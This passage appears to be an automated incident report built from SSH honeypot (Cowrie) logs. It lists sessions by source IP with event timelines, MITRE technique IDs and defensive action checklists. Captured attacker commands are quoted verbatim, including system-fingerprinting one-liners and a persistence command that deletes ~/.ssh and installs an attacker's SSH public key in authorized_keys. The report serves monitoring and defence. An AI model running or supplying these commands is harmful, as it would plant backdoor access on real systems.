- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478780034af2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:38 |
| **Last Seen** | 2026-07-24 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:38:27` | `cowrie.session.connect` |
| `2026-07-24 07:38:27` | `cowrie.client.version` |
| `2026-07-24 07:38:27` | `cowrie.client.kex` |
| `2026-07-24 07:38:27` | `cowrie.login.success` |
| `2026-07-24 07:38:28` | `cowrie.session.params` |
| `2026-07-24 07:38:28` | `cowrie.command.input` |
| `2026-07-24 07:38:28` | `cowrie.log.closed` |
| `2026-07-24 07:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd7180055cd

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]191` |
| **First Seen** | 2026-07-24 07:38 |
| **Last Seen** | 2026-07-24 07:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:38:42` | `cowrie.session.connect` |
| `2026-07-24 07:38:42` | `cowrie.client.version` |
| `2026-07-24 07:38:42` | `cowrie.client.kex` |
| `2026-07-24 07:38:44` | `cowrie.login.success` |
| `2026-07-24 07:38:45` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]191` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8c7e5cc096

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-24 07:38 |
| **Last Seen** | 2026-07-24 07:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:38:54` | `cowrie.session.connect` |
| `2026-07-24 07:38:55` | `cowrie.client.version` |
| `2026-07-24 07:38:55` | `cowrie.client.kex` |
| `2026-07-24 07:38:57` | `cowrie.login.success` |
| `2026-07-24 07:38:58` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8364662d61

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:39 |
| **Last Seen** | 2026-07-24 07:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:39:36` | `cowrie.session.connect` |
| `2026-07-24 07:39:36` | `cowrie.client.version` |
| `2026-07-24 07:39:36` | `cowrie.client.kex` |
| `2026-07-24 07:39:38` | `cowrie.login.success` |
| `2026-07-24 07:39:39` | `cowrie.session.params` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.success` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:39` | `cowrie.command.input` |
| `2026-07-24 07:39:40` | `cowrie.log.closed` |
| `2026-07-24 07:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8244aede3b86

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:40 |
| **Last Seen** | 2026-07-24 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:40:17` | `cowrie.session.connect` |
| `2026-07-24 07:40:17` | `cowrie.client.version` |
| `2026-07-24 07:40:18` | `cowrie.client.kex` |
| `2026-07-24 07:40:18` | `cowrie.login.success` |
| `2026-07-24 07:40:19` | `cowrie.session.params` |
| `2026-07-24 07:40:19` | `cowrie.command.input` |
| `2026-07-24 07:40:19` | `cowrie.log.closed` |
| `2026-07-24 07:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e097b48a35c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:41 |
| **Last Seen** | 2026-07-24 07:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:41:32` | `cowrie.session.connect` |
| `2026-07-24 07:41:32` | `cowrie.client.version` |
| `2026-07-24 07:41:32` | `cowrie.client.kex` |
| `2026-07-24 07:41:35` | `cowrie.login.success` |
| `2026-07-24 07:41:36` | `cowrie.session.params` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.success` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:36` | `cowrie.command.input` |
| `2026-07-24 07:41:37` | `cowrie.log.closed` |
| `2026-07-24 07:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd8e4b234e5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:42 |
| **Last Seen** | 2026-07-24 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:42:06` | `cowrie.session.connect` |
| `2026-07-24 07:42:06` | `cowrie.client.version` |
| `2026-07-24 07:42:06` | `cowrie.client.kex` |
| `2026-07-24 07:42:06` | `cowrie.login.success` |
| `2026-07-24 07:42:07` | `cowrie.session.params` |
| `2026-07-24 07:42:07` | `cowrie.command.input` |
| `2026-07-24 07:42:07` | `cowrie.log.closed` |
| `2026-07-24 07:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc1c95518b2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:43 |
| **Last Seen** | 2026-07-24 07:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:43:28` | `cowrie.session.connect` |
| `2026-07-24 07:43:29` | `cowrie.client.version` |
| `2026-07-24 07:43:29` | `cowrie.client.kex` |
| `2026-07-24 07:43:31` | `cowrie.login.success` |
| `2026-07-24 07:43:33` | `cowrie.session.params` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.success` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.command.input` |
| `2026-07-24 07:43:33` | `cowrie.log.closed` |
| `2026-07-24 07:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbec9fc12852

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:44 |
| **Last Seen** | 2026-07-24 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:44:01` | `cowrie.session.connect` |
| `2026-07-24 07:44:01` | `cowrie.client.version` |
| `2026-07-24 07:44:01` | `cowrie.client.kex` |
| `2026-07-24 07:44:01` | `cowrie.login.success` |
| `2026-07-24 07:44:02` | `cowrie.session.params` |
| `2026-07-24 07:44:02` | `cowrie.command.input` |
| `2026-07-24 07:44:02` | `cowrie.log.closed` |
| `2026-07-24 07:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f251b7ed3844

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-07-24 07:45 |
| **Last Seen** | 2026-07-24 07:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:45:12` | `cowrie.session.connect` |
| `2026-07-24 07:45:12` | `cowrie.client.version` |
| `2026-07-24 07:45:12` | `cowrie.client.kex` |
| `2026-07-24 07:45:12` | `cowrie.login.success` |
| `2026-07-24 07:45:13` | `cowrie.session.params` |
| `2026-07-24 07:45:13` | `cowrie.command.input` |
| `2026-07-24 07:45:13` | `cowrie.command.failed` |
| `2026-07-24 07:45:14` | `cowrie.log.closed` |
| `2026-07-24 07:45:14` | `cowrie.session.params` |
| `2026-07-24 07:45:14` | `cowrie.command.input` |
| `2026-07-24 07:45:15` | `cowrie.session.file_download` |
| `2026-07-24 07:45:15` | `cowrie.log.closed` |
| `2026-07-24 07:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e01ecc1020

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-07-24 07:45 |
| **Last Seen** | 2026-07-24 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:45:15` | `cowrie.session.connect` |
| `2026-07-24 07:45:15` | `cowrie.client.version` |
| `2026-07-24 07:45:15` | `cowrie.client.kex` |
| `2026-07-24 07:45:16` | `cowrie.login.success` |
| `2026-07-24 07:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ea1fb2fca18

| Field | Detail |
|---|---|
| **Source IP** | `200.63.168[.]90` |
| **First Seen** | 2026-07-24 07:45 |
| **Last Seen** | 2026-07-24 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:45:16` | `cowrie.session.connect` |
| `2026-07-24 07:45:16` | `cowrie.client.version` |
| `2026-07-24 07:45:16` | `cowrie.client.kex` |
| `2026-07-24 07:45:17` | `cowrie.login.success` |
| `2026-07-24 07:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.63.168[.]90` to AbuseIPDB if not already reported
- [ ] Block `200.63.168[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c973b9dff3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:45 |
| **Last Seen** | 2026-07-24 07:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:45:28` | `cowrie.session.connect` |
| `2026-07-24 07:45:29` | `cowrie.client.version` |
| `2026-07-24 07:45:29` | `cowrie.client.kex` |
| `2026-07-24 07:45:31` | `cowrie.login.success` |
| `2026-07-24 07:45:32` | `cowrie.session.params` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.success` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:32` | `cowrie.command.input` |
| `2026-07-24 07:45:33` | `cowrie.log.closed` |
| `2026-07-24 07:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde8b53a9493

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:45 |
| **Last Seen** | 2026-07-24 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:45:53` | `cowrie.session.connect` |
| `2026-07-24 07:45:53` | `cowrie.client.version` |
| `2026-07-24 07:45:53` | `cowrie.client.kex` |
| `2026-07-24 07:45:53` | `cowrie.login.success` |
| `2026-07-24 07:45:54` | `cowrie.session.params` |
| `2026-07-24 07:45:54` | `cowrie.command.input` |
| `2026-07-24 07:45:54` | `cowrie.log.closed` |
| `2026-07-24 07:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d0b8fcafbc

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-07-24 07:47 |
| **Last Seen** | 2026-07-24 07:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:47:27` | `cowrie.session.connect` |
| `2026-07-24 07:47:27` | `cowrie.client.version` |
| `2026-07-24 07:47:27` | `cowrie.client.kex` |
| `2026-07-24 07:47:28` | `cowrie.login.success` |
| `2026-07-24 07:47:29` | `cowrie.session.params` |
| `2026-07-24 07:47:29` | `cowrie.command.input` |
| `2026-07-24 07:47:29` | `cowrie.command.failed` |
| `2026-07-24 07:47:30` | `cowrie.log.closed` |
| `2026-07-24 07:47:31` | `cowrie.session.params` |
| `2026-07-24 07:47:31` | `cowrie.command.input` |
| `2026-07-24 07:47:31` | `cowrie.session.file_download` |
| `2026-07-24 07:47:31` | `cowrie.log.closed` |
| `2026-07-24 07:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758142eadc89

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:47 |
| **Last Seen** | 2026-07-24 07:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:47:29` | `cowrie.session.connect` |
| `2026-07-24 07:47:29` | `cowrie.client.version` |
| `2026-07-24 07:47:31` | `cowrie.client.kex` |
| `2026-07-24 07:47:32` | `cowrie.login.success` |
| `2026-07-24 07:47:34` | `cowrie.session.params` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.success` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.command.input` |
| `2026-07-24 07:47:34` | `cowrie.log.closed` |
| `2026-07-24 07:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237129359cbf

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-07-24 07:47 |
| **Last Seen** | 2026-07-24 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:47:31` | `cowrie.session.connect` |
| `2026-07-24 07:47:31` | `cowrie.client.version` |
| `2026-07-24 07:47:31` | `cowrie.client.kex` |
| `2026-07-24 07:47:32` | `cowrie.login.success` |
| `2026-07-24 07:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2e25c9690a

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-07-24 07:47 |
| **Last Seen** | 2026-07-24 07:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:47:33` | `cowrie.session.connect` |
| `2026-07-24 07:47:33` | `cowrie.client.version` |
| `2026-07-24 07:47:33` | `cowrie.client.kex` |
| `2026-07-24 07:47:34` | `cowrie.login.success` |
| `2026-07-24 07:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac478fed111b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:47 |
| **Last Seen** | 2026-07-24 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
